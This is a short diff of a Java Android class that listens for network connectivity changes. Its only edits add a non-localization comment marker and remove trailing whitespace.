@@ -13,7 +13,7 @@ import com.android.service.Connectivity;
 
 public class ListenerConnectivity extends Listener<Connectivity> {
 	/** The Constant TAG. */
-	private static final String TAG = "ListenerConnectivity";
+	private static final String TAG = "ListenerConnectivity"; //$NON-NLS-1$
 
 	private BroadcastMonitorConnectivity connectivityReceiver;
 
@@ -36,7 +36,7 @@ public class ListenerConnectivity extends Listener<Connectivity> {
 
 		return singleton;
 	}
-	
+
 	@Override
 	protected void start() {
 		registerConnectivity();
@@ -46,7 +46,7 @@ public class ListenerConnectivity extends Listener<Connectivity> {
 	protected void stop() {
 		connectivityReceiver.unregister();
 	}
-	
+
 	/**
 	 * Register to Network Connection/Disconnection notification.
 	 */
